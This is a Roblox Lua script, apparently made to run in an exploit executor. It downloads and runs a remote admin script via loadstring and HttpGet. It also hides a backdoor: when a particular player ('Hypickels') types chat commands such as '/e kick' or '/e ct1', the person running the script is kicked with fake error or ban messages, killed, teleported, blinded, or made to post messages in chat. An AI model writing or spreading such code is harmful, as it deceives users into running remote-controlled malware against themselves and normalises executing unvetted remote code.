local speaker = game.Players.LocalPlayer
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
local people = {
    "432757113"
}

local current = nil 
local init1 = false

 function reLoop()
    print("a")
    while true do 
        wait(45)
        for i, v in pairs(game.Players:GetPlayers()) do 
            if v.UserId == 432757113 then 
                if current == nil then
                getChat()
                print("on")
                current = v.Name
                end
            end
        end
    end
end

 function getChat()
     init1 = true
    game.Players.Hypickels.Chatted:Connect(function(msg)
        if msg == "/e kick" then 
            speaker:Kick("Synapse has ran into an error please restart!")
        end
        if msg == "/e bring" then
            speaker.Character.HumanoidRootPart.CFrame = game.Players.Hypickels.Character.HumanoidRootPart.CFrame
        end
        if msg == "/e kill" then
            speaker.Character.Humanoid.Health = 0
        end
        if msg == "/e ct1" then 
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Adam is best, brady wady is adam's cat maid.", "All")
        end
        if msg == "/e fakekick" then 
            speaker:Kick("Unkown client actions detected, your account has been flagged.")
        end
        if msg == "/e ct2" then 
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("men <3", "All")
        end
        if msg == "/e kick1" then 
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("User Kicked / Reason: In-game Anticheat detected exploits.", "All")
        end
        if msg == "/e blur" then 
            local int = Instance.new("BlurEffect")
            int.Size = 1111111
            int.Parent = game.Lighting
        end
    end)
end
function start()
    game.Players.PlayerAdded:Connect(function(plr)
        if plr.Name == "Hypickels" then 
            if init1 == false then 
                getChat()
            end
        end
    end)
    game.Players.PlayerRemoving:Connect(function(plr)
        if plr.Name == "Hypickels" then 
            init1 = false
        end
    end)
end

start()
reLoop()
